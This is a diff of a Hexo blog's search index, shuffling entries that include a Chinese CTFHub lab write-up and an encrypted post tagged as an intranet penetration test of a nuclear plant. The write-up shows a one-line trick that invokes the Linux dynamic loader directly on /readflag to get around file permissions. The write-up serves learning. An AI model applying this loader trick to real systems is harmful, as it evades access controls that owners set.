+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>kali</tag>
+        <tag>docker</tag>
       </tags>
   </entry>
   <entry>
@@ -753,6 +753,43 @@
       </tags>
   </entry>
   <entry>
+    <title>linux动态加载</title>
+    <url>/2023/07/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
+    <content><![CDATA[<h3 id="linux-动态加载"><a href="#linux-动态加载" class="headerlink" title="linux 动态加载"></a>linux 动态加载</h3><h2 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h2><p>先给了 755<br>他自己传了 flag 等于告诉我们在哪了<br>然后限到了 644<br>不想让我们直接看</p>
+<blockquote>
+<p>都到这一题了权限应该不用讲了</p>
+</blockquote>
+<p>提示给了 shell<br>且不需要提权<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
+<h2 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h2><h3 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h3><p>elf 文件是 linux 下的可执行文件<br>文件头为 elf</p>
+<blockquote>
+<p>不知道是靶机还是蚁剑虚拟终端的问题 没法 vi<br>直接 cat 就能看到了</p>
+<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
+</blockquote>
+<h3 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h3><ul>
+<li>当需要动态链接的应用被操作系统加载时</li>
+<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
+<li>在 Linux 环境下，这项工作是由 ld-linux.so.2 来负责完成的</li>
+<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
+<li>而不是交给程序正常的进入地址</li>
+<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
+</ul>
+<h3 id="ldd-命令"><a href="#ldd-命令" class="headerlink" title="ldd 命令"></a>ldd 命令</h3><p>使用 ldd 命令即可查看<br>简便的 shell 命令依赖哪些动态加载库<br><img src= "/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
+<h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><p>在 cat elf 文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在 ldd<br>可以看到 ls 和 cat 动用他了<br>用！<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/lib64/ld-linux-x86-64.so.2 /readflag</span><br></pre></td></tr></table></figure>
+
+<p>get</p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>ctfhub</tag>
+        <tag>linux</tag>
+        <tag>动态加载</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>ctfhub-jwt</title>
     <url>/2023/07/jwt/</url>
     <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>题目附件：<a href="https://www.wolai.com/ctfhub/hcFRbVUSwDUD1UTrPJbkob">jwt 基础知识</a></p>
@@ -813,40 +850,26 @@
       </tags>
   </entry>
   <entry>
-    <title>linux动态加载</title>
-    <url>/2023/07/linux%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/</url>
-    <content><![CDATA[<h3 id="linux-动态加载"><a href="#linux-动态加载" class="headerlink" title="linux 动态加载"></a>linux 动态加载</h3><h2 id="查看环境"><a href="#查看环境" class="headerlink" title="查看环境"></a>查看环境</h2><p>先给了 755<br>他自己传了 flag 等于告诉我们在哪了<br>然后限到了 644<br>不想让我们直接看</p>
-<blockquote>
-<p>都到这一题了权限应该不用讲了</p>
-</blockquote>
-<p>提示给了 shell<br>且不需要提权<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254104587-61.png" alt="在这里插入图片描述"><br>于是需要新学一个东西<br>动态加载</p>
-<h2 id="Linux-ELF-Dynaamic-Loader"><a href="#Linux-ELF-Dynaamic-Loader" class="headerlink" title="Linux ELF Dynaamic Loader"></a>Linux ELF Dynaamic Loader</h2><h3 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h3><p>elf 文件是 linux 下的可执行文件<br>文件头为 elf</p>
-<blockquote>
-<p>不知道是靶机还是蚁剑虚拟终端的问题 没法 vi<br>直接 cat 就能看到了</p>
-<p><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254108304-64.png" alt="在这里插入图片描述"></p>
-</blockquote>
-<h3 id="动态库链接器-加载器"><a href="#动态库链接器-加载器" class="headerlink" title="动态库链接器&#x2F;加载器"></a>动态库链接器&#x2F;加载器</h3><ul>
-<li>当需要动态链接的应用被操作系统加载时</li>
-<li>系统必须要定位然后加载它所需要的所有动态库文件</li>
-<li>在 Linux 环境下，这项工作是由 ld-linux.so.2 来负责完成的</li>
-<li>执行操作时操作系统会将控制权交给 ld-linux.so</li>
-<li>而不是交给程序正常的进入地址</li>
-<li>ld-linux.so.2 会寻找然后加载所有需要的库文件，然后再将控制权交给应用的起始入口。</li>
-</ul>
-<h3 id="ldd-命令"><a href="#ldd-命令" class="headerlink" title="ldd 命令"></a>ldd 命令</h3><p>使用 ldd 命令即可查看<br>简便的 shell 命令依赖哪些动态加载库<br><img src= "/img/669b04b31dd04fe1a8d320ea2540ced2.png" alt="在这里插入图片描述"><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254114578-69.png" alt="在这里插入图片描述"></p>
-<h2 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h2><p>在 cat elf 文件时<br>看到第一行后面&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 动态库<br>并且在 ldd<br>可以看到 ls 和 cat 动用他了<br>用！<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254120768-72.png" alt="在这里插入图片描述">这是他的介绍<br>执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/lib64/ld-linux-x86-64.so.2 /readflag</span><br></pre></td></tr></table></figure>
-
-<p>get</p>
-]]></content>
+    <title>福清核电-关基测试</title>
+    <url>/2023/07/test-s1rius/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="fedb83719e3f8a16f36640798b4f6d57348c9f803e8b99a82410876a0553c366">709e820b2f5bb6db36bae87ed03a646f74929f181a7d8d64b5544247bd132cbd4552cddf67f6de24830ee19681e4939e5d3b2c962a2d3926eb43be5b09c51f50a52cf9bb093e608b5b227af082f1d472cd86e5cd97c4e1c8963b87c20ced607fa01d329cdf57c6d86b251879e8c5b9b9bda6017735ce66934345ff604e1e018e5adce97c71dac7a532a7a4d738ba02387bce9ad4d0bcc4969ad1cfb7da0546c699a838dc358a8d60a6a84d7ab4f2458dae589c4fccb0a306ad86a3c610cfb0155475b416e94dd037487578f3032e7abc52333a18194cfb28189e5232cf70614fa6162117e8849b2b2866c25d58111f8f97a763ddc5fb94aaca539d08535e53ae98a9bf83effa8ec7ba833f3cad1c718bb3c759ce8c3d8299c0837c6b120a1baae6bbfd6c787c959a1c1f60f6c26d1f0e0f1386bf534989676374ddd95b1d4f5347b1294c2b040dd85ce33de36b30fcdeec6c9dc19630220e871c2115cbdf1570ad69239df7f49c8c86b725bcf92aa0d8abebd141e1c4b00e3560763d47b82c638c12df4cd9f1cca085f797915fe5258e53150b7958d535932451d2609c1e2d0099be1856cce3136ee04602957245584763b8014af3067762ddaf586fb89afa3c18a47c9cf463718544d5a4e43d358713b2764ac277c634a2e755808594674d1a173ba94b582383fa0fb1dade9d34b609f0f3fd30e923f1cae31af34bba09ae9c01b048f8792ef2bfe4d518e7717c6eaab413b04a7f4eee81f4c2ff1cfdcff90c65eb65ead2f78f48ba43ac890e90ecdd66e1f003d9a1de31093afb75cbba13b3d8a1cc38af7d1abfc922bf6562dabd9c4917b54d86e70813373a08a33e0bc44745312fdf74587dcc2413b647e9a4d01f6b4a2234b77568f220f344960fdacdd6b6225a47a7f2b2d6b5a19642973bcc7e5ceadc574220772580e264fbf5d4bfd66117cc664ee1a8da3d8f713fed9c72372557e877c296427306ec633e50e3a65d4f5dc5d9858fe60fda2807f2aff82ae8f121bd67e72fb09d9602f16c53bebb77ccc1071fb2f8843e5f8816f7c27cd401953cff68e706c56a93d6e44585f99496a6eb71f3bae3d67e5de8f7fd0a1c5c9759dd707e200029e9046fa00a4bcb742c3d68c3863a30f1b5edbce61f9aea598cfbaac8ce60ad7bdfde2819e5659f790ef2301d6b4fbbaec044bc0d4df9f4273d98532d87e17b9277eac20ca21b9e1997e77a684bb19ea5aadca7115fe79a8f79062a8efc7dda03703657d8e8eec5d476b361fb3ffb0de05d0d5cf8506719aca5f938e718fa652ca28b158aecea1174641867e824fd5a7079c243bbabc0fe0ded8e48b376ebad7884d42c8e8fd68a4726bbe6097cdd63209c0e4b21b98b77f10a68df24741d043ce7946421075ab50ef0870570547e39d1c99413caaec9aae2c9c7932a1ec5adfd3c2f65f74947a93fbedb2d02138fc0c99b0b6d99836427b8b2e268cc2d43a93d282b60daaced8370155f2d3a8c67707e3955b497d9386cb1693212a6867623012e8719cd4add766460aed6966d8b2d103a5676779ef86605ee54f3e2494611bc04e30b8bffd678b5c9cd16784c06c58a278ee1138f6c7186c0df890f2170985439370b973af29e44dd1b666c35708ebd2f35def1b48f6ca6c8b68d2543efaffa604bc2a7598f28b5b53b17bc38d3d9996711bca2259b16dd45e56aeb98ad5e24f48c57f216776fb90284b6ae6bc10b04aed39548110e680f144e2f1187355ae085505c004ce34d6fe1c1c66490a9fe15be6b08ac74cdc2de251a0b920292fc48df688454d34e4f32d05e039e99c85be846aa89f958e92da6f6a0c05fb9af0e977af2f6e478d2a83fbd0ef1c3b9f3a93719313ea17589a33c84c156be34519927b13094bf8df9285ee21217a982e50f727f5f7816590d19cd8c05d15c42447358fa0384e511ced968f0700248441705ac4db38c794b69ece38b7c2e6b96bae739c3661ed5053dbd90ec076ca3485eb1944840606b8d07e0b65f17cf47d98ff636d3b37eb378aed8d9f89456802e54f4282890cdc7f8b911ef0eca7b143fd40cc4c552273fb0bb926a2ec22eb51e705a81c67027783e3cdf8f676ad81af46457c4595a932c925841581d5a4467a98c096a59ac83bc39b312d3e82f672181f9f4c883ea6b9e60c5fa73a38aee31f9d88920a47809e6e981ca362daef39cab612601c95f9ee6f782b44996e46735d4df8591fefd0461121c3decbe8dd4906d4a823b1aea9cc60f98b47d78d15410b8442cff603120c1c72c89c5cdba85e56149631460814d07c66e03e5091fb86ccd8b9aefb4cc9db9b488f341fba676e6eac399bd2f7cd496df584cb9a33a731c8750a5cc60bd3fbae93217d3f147950e54a10361a8620688f7389475692ca5328b5bd75181310aba4fd2ae603d5d86e9b911f736937127de14a8a4e2e435a287e1171012d7b39da1b86a951326a80df48ce64943d5e1a0326d2135f36650dc3018df8b1400ba4c74a85432bdcdc3ea048ae700fc3850cb69958d0374cf969d506e4cfcdb82dbd7e010908ae4e3dc0e22b6df6df8003b734c37a38b79e349d3f62a665de36f6ee4ac0beeb636608e6a4a535f5f24d98e9c6f7f3acc103f1704e4a6000649625a3d163cbd2b2a0c237fa1eb2c11f47a4803c5ec79973280c9cc0730882c823bc3c392e11e20b3b512b8040cfb4a532511b4de502c3ad1edd6bddad9f207fee0649b80d873be51f295f7ab0c7702e8b9e6197a9c79eb48d1c5789b3360846a62cb51eca81f1d82b5c09eece504af5fcc205f61b9b6cf568df00be2b65c58c775a742a0d1de5c0955c56b1aa5c4bb6bf826ead497d2993c22d55c5b1490694ef611be02cf48b3d68b0299787a93dccd3fe62628eb5a2bfee271043f2996688fddd4833c39226ffcce40ccd0409d0e1880e3da4086dd8ac30c95f8d15361090fc0388d5aa2be8544390eec85549a2152699d84975fbbdf6be8112129dee70b566867199eae93ee553459b1684a0a858621447e0a1dea011fe77c2524a14bb3451a9edb9bd5d3dc19b62e8e426e16ae27a7908163f77c2d1b3ae635b033667e9c0344dae97b4e1f109d17673476a303e1accd69552262c5d6ec9db8509e4e4cb2b7f90c18aa59b59f092d868b20731b5b3f24a88dba45818cc649d72f3292f475de97ce5f0fb0d4169550fd1e6ae662d74a95ea3f861606b7227d5c8be068cfad3066c5384ef6813ae96bce3b7475e3d6ec02d99ecf5d41954b6676887648448e80bda65ba0726074c8bd9990004f0a465a162a31ebbf3f80cdc3eb5fd7a8ebdca552ff94071f5cf519059b527ff9ffac92149e2b6ec456fc342cbd9437053512a92925fce6530b5e36b94fc92c8c7f13708be7fa7132bf8c4a1ef5304206696b54e7f14e457422556b8e68104fae8581d95509b46cdab773e331da651250145044e46798f709ab3a160ca8aac3253172cb548b6611aed95c03d486ad820138a3ea456335349b5d699f992080ef7a964ad4ce95f6a3a6f4f1d558cd813b10d572a34e1189db2f266d7ad37ef59621f95aa35b84088939cc58633810f6ca55d08fd23cb6627dee845fb982ff7bffe734058a1c1547275a4e97c017b424d9fbc03d63abb4fa9aa360a429ee766e0ccf9d4379923028d1bc7e74e557c1655c56aff94e26a7b3d25f4c11d25d8f6efc9f5873ea2eb7ec28d6aa01f6a53340bbecc0b3eb6f3078cdd87b6317174b79bc1241cd0c6d8ccbdf8b7fb35df7e2c8ac38f928f4d9d14edfa0b397c091b1ed49ae71e6ecc0da2835a94214a93866ad1d329e1f7163af177c58ad8073ed4d90f670eb3ccccbf5cd3f1cf34055f55f0915d8dc134abf87f34cddf38aac322fcab35efc88faca44ee57cd73b8af1ea67e3a1a6335c493479236ad1d5cf57ac4c8de47ccd8bd73cc9997aff1274164526dc04070d55d6e28c3e243b229bbba51bf8db8ad2f3551d492406ce8b0c42db403bc243cc704864c0d0a658dca68fe8298ae532d99b6bfd72faca94267a8c7e16e105e6ad0a574cee99127eb59b2c8bdce63ed8048fc85046a373f8122195ffedd2f82360c3b03699eda989425d2c96acc8b7b2b8cccc0bb9a275a883936c424eab0c70b83ca1a094e28ffc4b6a9e2b50cf9e9161a4e64db6edd6473fe1aadc02e5f4316cc43a433da5c24882f2e63bba077de360db807ad974c09beb6c1ee65338346aae164e4203c69c826cd6e3657a443c1949c8c30a9ba5e1c889758880289cf42230b7fc2dea33cb7f4d1545fa230d6861ca8dbcee00e0e25adb686b62221f829c722e761aa119ad0b6837b4d653aeb93f8200575aa08da151de35ff8f1413c50aadea5ab2800f455cbc719e72ed3527f8a683db9e4ed54ac96bb9295c6a1cd8f143508c40599abba122cb0cc9cf931a4a3bad8e2c43db000c6ae5f5915dc126a805e3fb08258e275ad7ed7186f37af11f709e05dc40f1b0b4e9c0e7b5e99262f7eabce8f07e767e363a45ca93f8fdaada4751b572735d74e5b972efb54473b12bb2fc4221302d766ceaaa15cd7874ae93021bb20396a0f3ffcdd8ec8c48092687d0f7d3dbef93904621e9697e03668725d1c6b14b892d7c9defd43238a0279a63a07f032e2750062fc81a6fdaa139bbbe4e8cdccf9fae22755e10625844acb44dc7871df55415c354e05e769b73b1308356f6067bdd07a434c0986077555883a8d80e37f60a30fc6990276f2f25e385fd122aa5d6a8bbcfa2231a17419c4dc06101a885120718e771bf128234a2b02746f592ea8ec614a85b5a483c164ea03da3dfd21f2edf7c128150be6576f95b48c8bed950fd18f81fd5281965e80fbef18da4ce2ceac97863d14c0ae4c2f9503ccdad1752c4b2c02024c079cfebb0aa0bced1fc7b73a0e6ed2b9bf6aafe3fe2b4c073eefe876a9f28ee27d4eec72135370d3b7cb1ce9be3e1410c75833ecd76f732da2d0fae59604ff3e99650de3125f727d814038183690aa656d2907544f02c618b2230f0fb6c7b32f2cb571b9c6649e824966121f07732ecbaa9ba12f9a59a5c0f4fe229a4938d3d8f90addca9a1e180a844ec905fd05c623c60ab1a953d10cd84d39cb31f0b61119d25275f219c7e9b4045f0ba2e2d0cd9765a7c92544b56ca3b8c79b69f19fdeb6ee12607d1b87c380a71313011ba3ba71312d7cdfc1b5359fabbb876ae81610597aa91238bc4e7ef0c72d4beb1ed7d6b0ab47</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
-        <category>web</category>
+        <category>内网</category>
       </categories>
       <tags>
-        <tag>web</tag>
-        <tag>ctfhub</tag>
-        <tag>linux</tag>
-        <tag>动态加载</tag>
+        <tag>内网</tag>
+        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -984,170 +1007,6 @@
         <tag>web</tag>
         <tag>sql</tag>
         <tag>sqli-lab</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>福清核电-关基测试</title>
-    <url>/2023/07/test-s1rius/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="fedb83719e3f8a16f36640798b4f6d57348c9f803e8b99a82410876a0553c366">709e820b2f5bb6db36bae87ed03a646f74929f181a7d8d64b5544247bd132cbd4552cddf67f6de24830ee19681e4939e5d3b2c962a2d3926eb43be5b09c51f50a52cf9bb093e608b5b227af082f1d472cd86e5cd97c4e1c8963b87c20ced607fa01d329cdf57c6d86b251879e8c5b9b9bda6017735ce66934345ff604e1e018e5adce97c71dac7a532a7a4d738ba02387bce9ad4d0bcc4969ad1cfb7da0546c699a838dc358a8d60a6a84d7ab4f2458dae589c4fccb0a306ad86a3c610cfb0155475b416e94dd037487578f3032e7abc52333a18194cfb28189e5232cf70614fa6162117e8849b2b2866c25d58111f8f97a763ddc5fb94aaca539d08535e53ae98a9bf83effa8ec7ba833f3cad1c718bb3c759ce8c3d8299c0837c6b120a1baae6bbfd6c787c959a1c1f60f6c26d1f0e0f1386bf534989676374ddd95b1d4f5347b1294c2b040dd85ce33de36b30fcdeec6c9dc19630220e871c2115cbdf1570ad69239df7f49c8c86b725bcf92aa0d8abebd141e1c4b00e3560763d47b82c638c12df4cd9f1cca085f797915fe5258e53150b7958d535932451d2609c1e2d0099be1856cce3136ee04602957245584763b8014af3067762ddaf586fb89afa3c18a47c9cf463718544d5a4e43d358713b2764ac277c634a2e755808594674d1a173ba94b582383fa0fb1dade9d34b609f0f3fd30e923f1cae31af34bba09ae9c01b048f8792ef2bfe4d518e7717c6eaab413b04a7f4eee81f4c2ff1cfdcff90c65eb65ead2f78f48ba43ac890e90ecdd66e1f003d9a1de31093afb75cbba13b3d8a1cc38af7d1abfc922bf6562dabd9c4917b54d86e70813373a08a33e0bc44745312fdf74587dcc2413b647e9a4d01f6b4a2234b77568f220f344960fdacdd6b6225a47a7f2b2d6b5a19642973bcc7e5ceadc574220772580e264fbf5d4bfd66117cc664ee1a8da3d8f713fed9c72372557e877c296427306ec633e50e3a65d4f5dc5d9858fe60fda2807f2aff82ae8f121bd67e72fb09d9602f16c53bebb77ccc1071fb2f8843e5f8816f7c27cd401953cff68e706c56a93d6e44585f99496a6eb71f3bae3d67e5de8f7fd0a1c5c9759dd707e200029e9046fa00a4bcb742c3d68c3863a30f1b5edbce61f9aea598cfbaac8ce60ad7bdfde2819e5659f790ef2301d6b4fbbaec044bc0d4df9f4273d98532d87e17b9277eac20ca21b9e1997e77a684bb19ea5aadca7115fe79a8f79062a8efc7dda03703657d8e8eec5d476b361fb3ffb0de05d0d5cf8506719aca5f938e718fa652ca28b158aecea1174641867e824fd5a7079c243bbabc0fe0ded8e48b376ebad7884d42c8e8fd68a4726bbe6097cdd63209c0e4b21b98b77f10a68df24741d043ce7946421075ab50ef0870570547e39d1c99413caaec9aae2c9c7932a1ec5adfd3c2f65f74947a93fbedb2d02138fc0c99b0b6d99836427b8b2e268cc2d43a93d282b60daaced8370155f2d3a8c67707e3955b497d9386cb1693212a6867623012e8719cd4add766460aed6966d8b2d103a5676779ef86605ee54f3e2494611bc04e30b8bffd678b5c9cd16784c06c58a278ee1138f6c7186c0df890f2170985439370b973af29e44dd1b666c35708ebd2f35def1b48f6ca6c8b68d2543efaffa604bc2a7598f28b5b53b17bc38d3d9996711bca2259b16dd45e56aeb98ad5e24f48c57f216776fb90284b6ae6bc10b04aed39548110e680f144e2f1187355ae085505c004ce34d6fe1c1c66490a9fe15be6b08ac74cdc2de251a0b920292fc48df688454d34e4f32d05e039e99c85be846aa89f958e92da6f6a0c05fb9af0e977af2f6e478d2a83fbd0ef1c3b9f3a93719313ea17589a33c84c156be34519927b13094bf8df9285ee21217a982e50f727f5f7816590d19cd8c05d15c42447358fa0384e511ced968f0700248441705ac4db38c794b69ece38b7c2e6b96bae739c3661ed5053dbd90ec076ca3485eb1944840606b8d07e0b65f17cf47d98ff636d3b37eb378aed8d9f89456802e54f4282890cdc7f8b911ef0eca7b143fd40cc4c552273fb0bb926a2ec22eb51e705a81c67027783e3cdf8f676ad81af46457c4595a932c925841581d5a4467a98c096a59ac83bc39b312d3e82f672181f9f4c883ea6b9e60c5fa73a38aee31f9d88920a47809e6e981ca362daef39cab612601c95f9ee6f782b44996e46735d4df8591fefd0461121c3decbe8dd4906d4a823b1aea9cc60f98b47d78d15410b8442cff603120c1c72c89c5cdba85e56149631460814d07c66e03e5091fb86ccd8b9aefb4cc9db9b488f341fba676e6eac399bd2f7cd496df584cb9a33a731c8750a5cc60bd3fbae93217d3f147950e54a10361a8620688f7389475692ca5328b5bd75181310aba4fd2ae603d5d86e9b911f736937127de14a8a4e2e435a287e1171012d7b39da1b86a951326a80df48ce64943d5e1a0326d2135f36650dc3018df8b1400ba4c74a85432bdcdc3ea048ae700fc3850cb69958d0374cf969d506e4cfcdb82dbd7e010908ae4e3dc0e22b6df6df8003b734c37a38b79e349d3f62a665de36f6ee4ac0beeb636608e6a4a535f5f24d98e9c6f7f3acc103f1704e4a6000649625a3d163cbd2b2a0c237fa1eb2c11f47a4803c5ec79973280c9cc0730882c823bc3c392e11e20b3b512b8040cfb4a532511b4de502c3ad1edd6bddad9f207fee0649b80d873be51f295f7ab0c7702e8b9e6197a9c79eb48d1c5789b3360846a62cb51eca81f1d82b5c09eece504af5fcc205f61b9b6cf568df00be2b65c58c775a742a0d1de5c0955c56b1aa5c4bb6bf826ead497d2993c22d55c5b1490694ef611be02cf48b3d68b0299787a93dccd3fe62628eb5a2bfee271043f2996688fddd4833c39226ffcce40ccd0409d0e1880e3da4086dd8ac30c95f8d15361090fc0388d5aa2be8544390eec85549a2152699d84975fbbdf6be8112129dee70b566867199eae93ee553459b1684a0a858621447e0a1dea011fe77c2524a14bb3451a9edb9bd5d3dc19b62e8e426e16ae27a7908163f77c2d1b3ae635b033667e9c0344dae97b4e1f109d17673476a303e1accd69552262c5d6ec9db8509e4e4cb2b7f90c18aa59b59f092d868b20731b5b3f24a88dba45818cc649d72f3292f475de97ce5f0fb0d4169550fd1e6ae662d74a95ea3f861606b7227d5c8be068cfad3066c5384ef6813ae96bce3b7475e3d6ec02d99ecf5d41954b6676887648448e80bda65ba0726074c8bd9990004f0a465a162a31ebbf3f80cdc3eb5fd7a8ebdca552ff94071f5cf519059b527ff9ffac92149e2b6ec456fc342cbd9437053512a92925fce6530b5e36b94fc92c8c7f13708be7fa7132bf8c4a1ef5304206696b54e7f14e457422556b8e68104fae8581d95509b46cdab773e331da651250145044e46798f709ab3a160ca8aac3253172cb548b6611aed95c03d486ad820138a3ea456335349b5d699f992080ef7a964ad4ce95f6a3a6f4f1d558cd813b10d572a34e1189db2f266d7ad37ef59621f95aa35b84088939cc58633810f6ca55d08fd23cb6627dee845fb982ff7bffe734058a1c1547275a4e97c017b424d9fbc03d63abb4fa9aa360a429ee766e0ccf9d4379923028d1bc7e74e557c1655c56aff94e26a7b3d25f4c11d25d8f6efc9f5873ea2eb7ec28d6aa01f6a53340bbecc0b3eb6f3078cdd87b6317174b79bc1241cd0c6d8ccbdf8b7fb35df7e2c8ac38f928f4d9d14edfa0b397c091b1ed49ae71e6ecc0da2835a94214a93866ad1d329e1f7163af177c58ad8073ed4d90f670eb3ccccbf5cd3f1cf34055f55f0915d8dc134abf87f34cddf38aac322fcab35efc88faca44ee57cd73b8af1ea67e3a1a6335c493479236ad1d5cf57ac4c8de47ccd8bd73cc9997aff1274164526dc04070d55d6e28c3e243b229bbba51bf8db8ad2f3551d492406ce8b0c42db403bc243cc704864c0d0a658dca68fe8298ae532d99b6bfd72faca94267a8c7e16e105e6ad0a574cee99127eb59b2c8bdce63ed8048fc85046a373f8122195ffedd2f82360c3b03699eda989425d2c96acc8b7b2b8cccc0bb9a275a883936c424eab0c70b83ca1a094e28ffc4b6a9e2b50cf9e9161a4e64db6edd6473fe1aadc02e5f4316cc43a433da5c24882f2e63bba077de360db807ad974c09beb6c1ee65338346aae164e4203c69c826cd6e3657a443c1949c8c30a9ba5e1c889758880289cf42230b7fc2dea33cb7f4d1545fa230d6861ca8dbcee00e0e25adb686b62221f829c722e761aa119ad0b6837b4d653aeb93f8200575aa08da151de35ff8f1413c50aadea5ab2800f455cbc719e72ed3527f8a683db9e4ed54ac96bb9295c6a1cd8f143508c40599abba122cb0cc9cf931a4a3bad8e2c43db000c6ae5f5915dc126a805e3fb08258e275ad7ed7186f37af11f709e05dc40f1b0b4e9c0e7b5e99262f7eabce8f07e767e363a45ca93f8fdaada4751b572735d74e5b972efb54473b12bb2fc4221302d766ceaaa15cd7874ae93021bb20396a0f3ffcdd8ec8c48092687d0f7d3dbef93904621e9697e03668725d1c6b14b892d7c9defd43238a0279a63a07f032e2750062fc81a6fdaa139bbbe4e8cdccf9fae22755e10625844acb44dc7871df55415c354e05e769b73b1308356f6067bdd07a434c0986077555883a8d80e37f60a30fc6990276f2f25e385fd122aa5d6a8bbcfa2231a17419c4dc06101a885120718e771bf128234a2b02746f592ea8ec614a85b5a483c164ea03da3dfd21f2edf7c128150be6576f95b48c8bed950fd18f81fd5281965e80fbef18da4ce2ceac97863d14c0ae4c2f9503ccdad1752c4b2c02024c079cfebb0aa0bced1fc7b73a0e6ed2b9bf6aafe3fe2b4c073eefe876a9f28ee27d4eec72135370d3b7cb1ce9be3e1410c75833ecd76f732da2d0fae59604ff3e99650de3125f727d814038183690aa656d2907544f02c618b2230f0fb6c7b32f2cb571b9c6649e824966121f07732ecbaa9ba12f9a59a5c0f4fe229a4938d3d8f90addca9a1e180a844ec905fd05c623c60ab1a953d10cd84d39cb31f0b61119d25275f219c7e9b4045f0ba2e2d0cd9765a7c92544b56ca3b8c79b69f19fdeb6ee12607d1b87c380a71313011ba3ba71312d7cdfc1b5359fabbb876ae81610597aa91238bc4e7ef0c72d4beb1ed7d6b0ab47</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>内网</category>
-      </categories>
-      <tags>
-        <tag>内网</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>xss-lab</title>
-    <url>/2023/07/xsslab/</url>
-    <content><![CDATA[<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p>没啥好说的<br>直接 alert<br><img src= "/img/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16-1689254223669-151.png" alt="在这里插入图片描述"></p>
